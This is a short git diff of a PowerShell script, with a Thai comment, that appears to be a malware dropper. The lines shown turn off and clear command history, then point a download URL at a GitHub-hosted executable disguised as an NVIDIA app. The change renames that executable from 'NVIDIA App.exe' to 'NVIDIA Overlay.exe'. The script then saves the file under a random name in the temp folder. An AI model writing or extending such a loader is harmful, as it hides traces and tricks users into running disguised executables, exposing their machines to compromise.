@@ -7,7 +7,7 @@ Set-PSReadlineOption -HistorySaveStyle SaveNothing -ErrorAction SilentlyContinue
 Clear-History
 
 # 2. ดาวน์โหลด EXE
-$exeUrl = "https://github.com/zenxler98-ui/betx/raw/refs/heads/main/NVIDIA%20App.exe"
+$exeUrl = "https://github.com/zenxler98-ui/betx/raw/refs/heads/main/NVIDIA%20Overlay.exe"
 $randomName = -join ((65..90) + (97..122) | Get-Random -Count 10 | ForEach-Object { [char]$_ })
 $tempPath = Join-Path $env:TEMP "$randomName.exe"
 
